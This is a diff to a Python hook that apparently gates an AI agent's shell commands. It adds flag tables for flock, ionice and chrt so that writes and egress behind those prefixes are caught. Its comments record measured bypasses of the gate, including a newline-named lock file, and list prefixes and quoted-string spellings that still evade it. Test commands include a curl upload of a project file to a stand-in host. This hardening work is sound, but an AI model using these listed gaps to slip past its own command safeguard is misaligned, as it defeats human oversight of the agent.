@@ -47,7 +47,7 @@
 # A WRAPPER PREFIX in front of one of those vectors is stepped over by verb_at, not by
 # each consumer, so `timeout 5 cp seed.txt src/y.py`, `nice -n 5 tee src/y.py` and
 # `ls | xargs sed -i s/a/b/ src/y.py` are gated exactly as the unprefixed forms are; see
-# WRAPPERS in the extractor for the thirteen prefixes and their flag tables. What that
+# WRAPPERS in the extractor for the sixteen prefixes and their flag tables. What that
 # does NOT reach is a body that arrives as ONE QUOTED STRING: `bash -c "cp seed.txt
 # src/y.py"` and `watch -n1 'cp seed.txt src/y.py'` both emit the empty set, because the
 # quoted command is a single token and no consumer arm matches it. The uncovered-prefix
@@ -285,10 +285,11 @@
 # proxy URL's credentials never reach the retained audit reason).
 #
 # The verb is resolved by verb_at(), NOT seg[0]: leading NAME=value assignments, the
-# wrapper prefixes (command / env / exec / nohup / time, sudo / doas, and as of cycle P
-# timeout / nice / stdbuf / watch / setsid / xargs) with their own flags and, for
-# `timeout`, its own duration positional, and a leading backslash all sit in FRONT of the
-# real command. One helper serves
+# wrapper prefixes (command / env / exec / nohup / time, sudo / doas, as of cycle P
+# timeout / nice / stdbuf / watch / setsid / xargs, and as of cycle S flock / ionice /
+# chrt) with their own flags and, for the three that take one, their own positional
+# argument (timeout's duration, flock's lock target, chrt's priority), and a leading
+# backslash all sit in FRONT of the real command. One helper serves
 # both the egress pass and the write extractor, so `FOO=1 tee f`, `env FOO=1 cp a b` and
 # `sudo cp a b` are gated as writes for the same reason `FOO=1 curl -d @f https://host`
 # prompts. sudo/doas are parsed STRICTLY, mirroring sudo's real short-option grammar for
@@ -316,8 +317,12 @@
 # before the command and a naive skip would mis-read the verb". That reason was true of
 # exactly ONE of the six. All six are now WRAPPERS entries with STRICT flag tables, and
 # `timeout`'s single duration positional is stepped by WRAPPER_POSITIONALS with a shape
-# check; the other five have no positional at all. What remains uncovered, with the
-# reason for each, and then the names alone in a machine-readable block:
+# check; the other five have no positional at all. Cycle S closed three more the same
+# way, flock / ionice / chrt, each MEASURED silent on both halves first (the rows are
+# beside their tables in the extractor); flock's mandatory lock target and chrt's priority
+# joined WRAPPER_POSITIONALS, ionice takes no positional of its own. What remains
+# uncovered, with the reason for each, and then the names alone in a machine-readable
+# block:
 #
 #   fd --exec / fd -x       The SAME nested-command mechanism under another tool's flag
 #                           spellings, which NESTED_CMD_FLAGS does not carry. NOT
@@ -333,21 +338,28 @@
 #                           INLINE_INTERPRETERS for the measured spellings.
 #   coproc / function       Both take an OPTIONAL NAME, which is not distinguishable from
 #                           the command; see GROUP_VERB_TOKENS.
-#   ionice / chrt / flock / unbuffer / script / parallel / su -c / strace
-#                           Further transparent prefixes with no table here yet. Each is
-#                           a table away, not a mechanism away; none is measured.
+#   unbuffer / parallel / fd
+#                           NOT INSTALLED on this machine, so their gaps are UNMEASURABLE
+#                           here rather than merely unmeasured, and no table is added on
+#                           inference. (fd is also the nested-command mechanism under
+#                           another tool's flag spellings, named above.)
+#   script / su -c / strace Further transparent prefixes with no table here yet. Each is a
+#                           table away, not a mechanism away; none is measured.
 #
-# Three per-spelling MISSES the new tables knowingly accept, each pinned as a silence in
+# Four per-spelling MISSES the tables knowingly accept, each pinned as a silence in
 # tests/test_bash_wrapper_prefix_gate.py rather than left to be rediscovered: the obsolete
 # numeric `nice -5 cp ...` (an unknown option letter, so it bails), the glued
-# optional-argument short `xargs -iX cp {} src/y.py` (unknown letter after `-i`), and any
-# prefix whose command arrives as ONE QUOTED STRING (`watch -n1 'cp seed.txt src/y.py'`).
-# They are spellings of COVERED prefixes, so they are deliberately NOT in the block below:
-# the block is names only, and a name there must not also be a WRAPPERS key.
+# optional-argument short `xargs -iX cp {} src/y.py` (unknown letter after `-i`), any
+# prefix whose command arrives as ONE QUOTED STRING (`watch -n1 'cp seed.txt src/y.py'`),
+# and flock's own `-c/--command` form (`flock /tmp/l.lock -c 'cp seed.txt src/y.py'`),
+# which is that same quoted-string class: the lock target is stepped, `-c` then sits in
+# verb position, and the whole body is one token. They are spellings of COVERED prefixes,
+# so they are deliberately NOT in the block below: the block is names only, and a name
+# there must not also be a WRAPPERS key.
 #
 # UNCOVERED PREFIXES BEGIN (names only; the reasons are in the prose above)
 # sh -c, bash -c, eval, coproc, function, fd --exec, fd -x,
-# ionice, chrt, flock, unbuffer, script, parallel, su -c, strace
+# unbuffer, script, parallel, su -c, strace
 # UNCOVERED PREFIXES END
 #
 # The worktree gate carries its OWN prefix set (writ-worktree-safety.sh) and it was NOT
@@ -1503,6 +1515,65 @@ TIMEOUT_VALUE_FLAGS = frozenset({"-s", "--signal", "-k", "--kill-after"})
 TIMEOUT_NOVALUE_FLAGS = frozenset({
     "--preserve-status", "--foreground", "-v", "--verbose", "--help", "--version",
 })
+# ── The three prefixes closed in cycle S: flock / ionice / chrt ───────────────
+#
+# MEASURED silent through THIS extractor before these tables existed, on BOTH halves,
+# for the one reason cycle P found: verb_at is the single source for the write pass and
+# the egress pass, so a prefix it does not know hides both.
+#   flock /tmp/l.lock cp seed.txt src/y.py                        -> set()
+#   ionice -c3 cp seed.txt src/y.py                               -> set()
+#   chrt -b 0 cp seed.txt src/y.py                                -> set()
+#   flock /tmp/l.lock curl -d @src/a.txt https://example.invalid  -> set()
+#   ionice -c3 curl -d @src/a.txt https://example.invalid         -> set()
+#   chrt -b 0 curl -d @src/a.txt https://example.invalid          -> set()
+# while the bare `cp seed.txt src/y.py` emitted `local /proj/src/y.py` and the bare
+# `curl -d @src/a.txt https://example.invalid` emitted its egress row. Measured at the
+# OUTER hook layer as well, with a crafted PreToolUse envelope from a cwd outside the
+# project: `cp README.md ~/outside_probe.txt` and `nice cp README.md ~/outside_probe.txt`
+# both DENIED with [ENF-PROJECT-BOUNDARY], while all three prefixed spellings of the same
+# write were ALLOWED SILENTLY, with no decision at all.
+#
+# STRICT (both sets present), never PERMISSIVE, for cycle P's reason, and it matters MORE
+# here because two of the three also step a positional: an unknown or mis-classified flag
+# costs a MISS, never a prompt naming the wrong command.
+#
+# Each table is read off the INSTALLED binary's own --help on this machine, util-linux
+# 2.39.3 for all three, NOT off the bash-completion files the plan drafted from. That
+# corrected ONE classification: the completion file reads ionice's -p/-P/-u as bare
+# switches, while `ionice --help` spells them `-p, --pid <pid>...`, so they are VALUE
+# flags here. chrt's -a/--all-tasks, -m/--max, -v/--verbose and -p/--pid are all named by
+# 2.39.3's own --help and are listed; its -p really is value-less (the pid follows as a
+# positional, `chrt [options] -p <pid>`). flock 2.39.3 prints no --nb / --wait aliases, so
+# neither is listed. A LETTER MEANS DIFFERENT THINGS IN DIFFERENT TABLES, so these three
+# must never be copy-pasted between one another: flock's -n is --nonblock (no value) while
+# ionice's -n is --classdata (value), and chrt's -P is --sched-period (value) while
+# ionice's -P is --pgid (also value, but of a different tool's grammar).
+FLOCK_VALUE_FLAGS = frozenset({
+    "-w", "--timeout", "-E", "--conflict-exit-code", "-c", "--command",
+})
+FLOCK_NOVALUE_FLAGS = frozenset({
+    "-s", "--shared", "-x", "--exclusive", "-u", "--unlock", "-n", "--nonblock",
+    "-o", "--close", "-F", "--no-fork", "--verbose", "-h", "--help",
+    "-V", "--version",
+})
+# ionice's -p/-P/-u id forms run NO command at all (`ionice -p 1234` only reports or sets
+# a class), so no classification of them can lose a write; they are VALUE because that is
+# what --help prints.
+IONICE_VALUE_FLAGS = frozenset({
+    "-c", "--class", "-n", "--classdata", "-p", "--pid", "-P", "--pgid", "-u", "--uid",
+})
+IONICE_NOVALUE_FLAGS = frozenset({
+    "-t", "--ignore", "-h", "--help", "-V", "--version",
+})
+CHRT_VALUE_FLAGS = frozenset({
+    "-T", "--sched-runtime", "-P", "--sched-period", "-D", "--sched-deadline",
+})
+CHRT_NOVALUE_FLAGS = frozenset({
+    "-b", "--batch", "-d", "--deadline", "-f", "--fifo", "-i", "--idle",
+    "-o", "--other", "-r", "--rr", "-R", "--reset-on-fork",
+    "-a", "--all-tasks", "-m", "--max", "-p", "--pid", "-v", "--verbose",
+    "-h", "--help", "-V", "--version",
+})
 # Wrapper -> (flags whose value is the NEXT token, flags known to take no value).
 #
 # A None second element means PERMISSIVE: any dash token is skipped. Safe for these
@@ -1529,19 +1600,57 @@ WRAPPERS = {
     "watch": (WATCH_VALUE_FLAGS, WATCH_NOVALUE_FLAGS),
     "setsid": (SETSID_VALUE_FLAGS, SETSID_NOVALUE_FLAGS),
     "xargs": (XARGS_VALUE_FLAGS, XARGS_NOVALUE_FLAGS),
+    "flock": (FLOCK_VALUE_FLAGS, FLOCK_NOVALUE_FLAGS),
+    "ionice": (IONICE_VALUE_FLAGS, IONICE_NOVALUE_FLAGS),
+    "chrt": (CHRT_VALUE_FLAGS, CHRT_NOVALUE_FLAGS),
 }
 # How many NON-FLAG positional arguments of its own a wrapper takes before the command.
-# ONE member, because only one of the thirteen wrappers has a genuine positional:
-# `timeout DURATION COMMAND`. A side table rather than a third element in the WRAPPERS
-# tuple, so the twelve other entries stay byte-identical and no existing prefix changes
-# behavior by one token (.get(name, 0) is 0 for all of them).
-WRAPPER_POSITIONALS = {"timeout": 1}
-# The step is SHAPE-CHECKED, not blind: coreutils spells a duration as a float with an
-# optional s/m/h/d suffix. A token that does not look like one is NOT skipped and becomes
-# the verb, which is the fail-closed direction for DETECTION -- the only command that
-# lands there is one `timeout` itself rejects (it requires a duration), so the cost is at
-# worst an extra row for a command that never runs, never a lost row for one that does.
-DURATION = re.compile(r"^[0-9]+(?:\.[0-9]+)?[smhd]?$")
+# THREE members of sixteen, because three wrappers have a genuine positional:
+# `timeout DURATION COMMAND`, `flock FILE COMMAND` and `chrt PRIORITY COMMAND`. Still a
+# side table rather than a third element in the WRAPPERS tuple, so the thirteen other
+# entries stay byte-identical and no existing prefix changes behavior by one token
+# (.get(name, 0) is 0 for all of them).
+#
+# WHAT QUALIFIES a wrapper for this table is that its positional is MANDATORY, not that it
+# has a checkable shape. All three require theirs in every command-running form, so
+# stepping one reads the tool's own grammar rather than guessing against it. `coproc` and
+# `function` are excluded for the opposite reason and stay out: their NAME is OPTIONAL, so
+# stepping it IS a guess (see GROUP_VERB_TOKENS).
+WRAPPER_POSITIONALS = {"timeout": 1, "flock": 1, "chrt": 1}
+# The SHAPE of that positional, PER WRAPPER, because the three are not the same kind of
+# token and one regex for all three re-blinds whichever it does not fit.
+#
+# timeout and chrt are SHAPE-CHECKED: coreutils spells a duration as a float with an
+# optional s/m/h/d suffix, and a chrt priority is a non-negative integer. A token that
+# does not look like one is NOT skipped and becomes the verb, which is the fail-closed
+# direction for DETECTION. The only command that lands there is one the tool itself
+# rejects (`timeout` requires a duration; `chrt -b cp a b` is "invalid priority
+# argument"), so the cost is at worst an extra row for a command that never runs, never a
+# lost row for one that does.
+#
+# flock's lock target is stepped UNCONDITIONALLY, and a shape check there would BE the
+# defect rather than the guard: a lock file can be named anything, so a shape that rejects
+# `/tmp/l.lock` would leave the path unskipped and resolve `l.lock` as the verb, which is
+# exactly the blindness this cycle closes. One skip is right in both spellings, because
+# with a command present flock reads the first positional as a FILE even when it looks
+# numeric (`flock -x 200 cp a b` really does run cp). The `i < len(seg)` guard is what
+# makes the fd-only form (`flock -x 200`) and the bare `flock` land past the end with no
+# verb instead of raising; both run no command, so nothing is lost.
+#
+# The lookup in verb_at is a bare SUBSCRIPT, not .get with a default: a positional entry
+# with no shape entry is a table drift, and a loud failure (pinned by the key-set parity
+# check in tests/test_bash_wrapper_prefix_gate.py) beats a silently-chosen default.
+DURATION = re.compile(r"^[0-9]+(?:\.[0-9]+)?[smhd]?$")     # timeout: coreutils duration
+PRIORITY = re.compile(r"^[0-9]+$")                         # chrt: non-negative integer
+# flock: any non-empty token. `[\s\S]`, NOT `.`, and this is not style: python's `.` does
+# not match a newline without re.DOTALL, so `flock $'\n' cp x outside` left the lock target
+# unskipped, resolved the newline as the verb, and went silent on the write, credential and
+# egress passes at once. Real flock accepts a lock file named with a newline and runs the
+# wrapped command, so that spelling was a live bypass, measured against this hook. An empty
+# token still does not match, which is correct: flock exits 66 on an empty lock name, so
+# nothing runs.
+LOCK_TARGET = re.compile(r"[\s\S]")
+WRAPPER_POSITIONAL_SHAPES = {"timeout": DURATION, "flock": LOCK_TARGET, "chrt": PRIORITY}
 # Assignments that silently move the real destination. `no_proxy` is excluded: it
 # DISABLES proxying, it does not redirect. Compared lowercased, so HTTPS_PROXY counts.
 PROXY_ASSIGN_NAMES = {"http_proxy", "https_proxy", "all_proxy"}
@@ -1631,7 +1740,7 @@ def verb_at(seg):
         # four cases. A bail inside the flag loop RETURNS outright, so the step is never
         # reached with an unclassified option.
         for _ in range(WRAPPER_POSITIONALS.get(name, 0)):
-            if i < len(seg) and DURATION.match(dequote(seg[i])):
+            if i < len(seg) and WRAPPER_POSITIONAL_SHAPES[name].match(dequote(seg[i])):
                 i += 1
     return "", len(seg), assigns
 
